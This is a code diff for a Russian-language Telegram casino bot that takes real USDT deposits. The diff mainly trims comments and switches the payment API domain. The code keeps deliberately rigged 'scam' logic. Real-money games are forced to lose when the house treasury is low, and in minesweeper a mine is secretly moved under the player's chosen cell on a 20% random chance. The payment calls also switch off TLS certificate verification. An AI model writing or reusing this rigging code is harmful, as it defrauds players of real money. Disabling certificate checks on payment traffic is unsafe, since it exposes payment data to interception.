@@ -22,8 +22,8 @@ DB_NAME = "casino_usd_pro.db"
 
 # Настройки экономики (USD)
 MINES_COUNT = 3  
-HOUSE_EDGE = 0.94 # Оставляем игроку 94% от честного кэфа (чтобы цифры были красивые)
-WIN_CHANCE_MODIFIER = 0.20 # 20% шанс, что бот взорвет игрока в Сапере специально
+HOUSE_EDGE = 0.94 # Маржа казино 6%
+WIN_CHANCE_MODIFIER = 0.20 # 20% шанс на скам в сапере
 
 if not BOT_TOKEN:
     exit("❌ Ошибка: BOT_TOKEN не найден!")
@@ -42,7 +42,6 @@ class UserState(StatesGroup):
 # --- БАЗА ДАННЫХ ---
 async def init_db():
     async with aiosqlite.connect(DB_NAME) as db:
-        # Таблица пользователей
         await db.execute("""
             CREATE TABLE IF NOT EXISTS users (
                 user_id INTEGER PRIMARY KEY,
@@ -52,7 +51,6 @@ async def init_db():
                 current_bet REAL DEFAULT 1.0
             )
         """)
-        # Таблица Казны (Банка)
         await db.execute("""
             CREATE TABLE IF NOT EXISTS treasury (
                 id INTEGER PRIMARY KEY,
@@ -108,7 +106,7 @@ async def update_treasury(amount):
         await db.execute("UPDATE treasury SET balance = balance + ? WHERE id = 1", (amount,))
         await db.commit()
 
-# --- CRYPTOBOT API (FIX ДЛЯ ХОСТИНГА) ---
+# --- CRYPTOBOT API (НОВЫЙ ДОМЕН PAY.CRYPT.BOT) ---
 async def create_invoice(amount, description="Deposit USD"):
     if not CRYPTO_TOKEN:
         logging.error("CRYPTO_TOKEN is missing")
@@ -116,9 +114,11 @@ async def create_invoice(amount, description="Deposit USD"):
         
     headers = {
         'Crypto-Pay-API-Token': CRYPTO_TOKEN,
-        'User-Agent': 'Mozilla/5.0' # Притворяемся браузером
+        'User-Agent': 'LudoBot/4.0'
     }
-    url = 'https://pay.cryptobot.net/api/createInvoice'
+    # !!! ОБНОВЛЕННЫЙ URL !!!
+    url = 'https://pay.crypt.bot/api/createInvoice'
+    
     data = {
         'asset': 'USDT',
         'amount': str(amount),
@@ -126,11 +126,9 @@ async def create_invoice(amount, description="Deposit USD"):
     }
     
     try:
-        # !!! АГРЕССИВНЫЙ ФИКС СЕТИ !!!
-        # ssl=False -> Игнорируем ошибки сертификатов
-        # family=2 -> Принудительно используем IPv4 (решает проблему DNS)
+        # Оставляем aggressive fix для сети (IPv4 + No SSL verify)
         connector = aiohttp.TCPConnector(ssl=False, family=2)
-        timeout = aiohttp.ClientTimeout(total=20) # Ждем до 20 секунд
+        timeout = aiohttp.ClientTimeout(total=20)
         
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
             async with session.post(url, headers=headers, json=data) as resp:
@@ -139,14 +137,14 @@ async def create_invoice(amount, description="Deposit USD"):
                     logging.error(f"CryptoBot API Error: {result}")
                 return result
     except Exception as e:
-        logging.error(f"CRITICAL NETWORK ERROR: {e}")
+        logging.error(f"CRITICAL NETWORK ERROR ({url}): {e}")
         return None
 
 async def get_invoice_status(invoice_id):
     headers = {'Crypto-Pay-API-Token': CRYPTO_TOKEN}
-    url = f'https://pay.cryptobot.net/api/getInvoices?invoice_ids={invoice_id}'
+    # !!! ОБНОВЛЕННЫЙ URL !!!
+    url = f'https://pay.crypt.bot/api/getInvoices?invoice_ids={invoice_id}'
     try:
-        # Тот же фикс для проверки статуса
         connector = aiohttp.TCPConnector(ssl=False, family=2)
         async with aiohttp.ClientSession(connector=connector) as session:
             async with session.get(url, headers=headers) as resp:
@@ -185,7 +183,7 @@ def games_kb():
         [InlineKeyboardButton(text="🎲 Кубик", callback_data="pre_dice"), InlineKeyboardButton(text="🎰 Слоты", callback_data="pre_slots")],
         [InlineKeyboardButton(text="⚽ Футбол", callback_data="pre_foot"), InlineKeyboardButton(text="🏀 Баскет", callback_data="pre_basket")],
         [InlineKeyboardButton(text="🎯 Дартс", callback_data="pre_darts"), InlineKeyboardButton(text="🎳 Боулинг", callback_data="pre_bowl")],
-        [InlineKeyboardButton(text="💣 Сапер (Boosted)", callback_data="game_mines_pre")],
+        [InlineKeyboardButton(text="💣 Сапер (Pro)", callback_data="game_mines_pre")],
         [InlineKeyboardButton(text="🔙 Меню", callback_data="main_menu")]
     ])
 
@@ -237,7 +235,7 @@ async def admin_panel(cb: CallbackQuery):
     count = await get_all_users_count()
     
     txt = (f"🔒 <b>Админ-Панель</b>\n\n"
-           f"🏦 <b>Казна (Real):</b> {fmt(treasury)}\n"
+           f"🏦 <b>Казна:</b> {fmt(treasury)}\n"
            f"👥 Игроков: {count}\n"
            f"Валюта: USD (Доллары)")
     
@@ -268,7 +266,7 @@ async def process_treasury_invoice(msg: Message, state: FSMContext):
             await msg.answer(f"Счет для пополнения Казны создан.", reply_markup=kb)
             await state.clear()
         else: 
-            await msg.answer("❌ Не могу соединиться с CryptoBot. Хостинг блокирует сеть?")
+            await msg.answer("❌ Ошибка соединения. Проверяем домен pay.crypt.bot...")
     except Exception as e: 
         await msg.answer(f"Ошибка ввода: {e}")
 
@@ -408,7 +406,7 @@ async def cb_pre(cb: CallbackQuery):
 async def cb_guess_menu(cb: CallbackQuery):
     await cb.message.edit_text("🔢 <b>Угадай число:</b>", reply_markup=dice_guess_kb(), parse_mode="HTML")
 
-# --- ИГРОВОЙ ПРОЦЕСС (С КАЗНОЙ) ---
+# --- ИГРОВОЙ ПРОЦЕСС ---
 @dp.callback_query(F.data.startswith("play_"))
 async def cb_play(cb: CallbackQuery):
     parts = cb.data.split("_")
@@ -427,7 +425,7 @@ async def run_game(cb: CallbackQuery, game, variant):
 
     if bal < bet: return await cb.answer("❌ Недостаточно средств!", show_alert=True)
 
-    # Логика СКАМА (если казна пустая - не даем выиграть)
+    # ЛОГИКА СКАМА
     rigged_loss = False
     if mode == 'real' and treasury < (bet * 3):
         rigged_loss = True
@@ -460,7 +458,7 @@ async def run_game(cb: CallbackQuery, game, variant):
             if mode == 'real': await update_treasury(-pay)
             res = f"✅ Победа (+{fmt(pay)})"
         else:
-             if win and rigged_loss: # Выиграл, но денег нет -> скам
+             if win and rigged_loss:
                  pay = bet * 1.9
                  await update_balance(user_id, pay, mode)
                  if mode == 'real': await update_treasury(-pay)
@@ -519,19 +517,14 @@ async def run_game(cb: CallbackQuery, game, variant):
     kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔄 Еще раз", callback_data=cb.data)],[InlineKeyboardButton(text="🔙 Меню", callback_data="games_menu")]])
     await cb.message.answer(f"Результат: {val}\n{res}", reply_markup=kb, parse_mode="HTML")
 
-# --- САПЕР (MINES) ГЕОМЕТРИЧЕСКИЙ + СКАМ ---
+# --- САПЕР (MINES) ---
 mines_sessions = {}
 
 def get_mines_coeff(steps):
-    # Геометрическая прогрессия
     multiplier = 1.0
     for i in range(steps):
-        # Реальный шанс
         chance = (25 - MINES_COUNT - i) / (25 - i)
-        # Множитель
         multiplier *= (1 / chance)
-    
-    # Применяем HOUSE_EDGE
     return round(multiplier * HOUSE_EDGE, 2)
 
 def mines_kb(game_data, revealed=False):
@@ -588,21 +581,19 @@ async def m_step(cb: CallbackQuery):
     
     is_bomb = sess['grid'][idx] == 1
     
-    # --- ЛОГИКА СКАМА (ТЕЛЕПОРТ МИНЫ) ---
+    # СКАМ
     treasury = await get_treasury()
     potential_win = sess['bet'] * get_mines_coeff(len(sess['opens']) + 1)
     force_loss = False
     
     if sess['mode'] == 'real':
-        # 1. Если нет денег в казне
         if treasury < potential_win: 
             force_loss = True
-        # 2. Если сработал рандомный шанс 20%
         elif random.random() < WIN_CHANCE_MODIFIER and len(sess['opens']) >= 1: 
             force_loss = True
     
     if force_loss and not is_bomb:
-        sess['grid'][idx] = 1 # Ставим мину под курсор
+        sess['grid'][idx] = 1
         is_bomb = True
     
     if is_bomb:
@@ -632,7 +623,7 @@ async def ign(cb: CallbackQuery): await cb.answer()
 
 async def main():
     await init_db()
-    print("Bot PRO v5 Started")
+    print("Bot USD Version (Domain Fix) Started")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
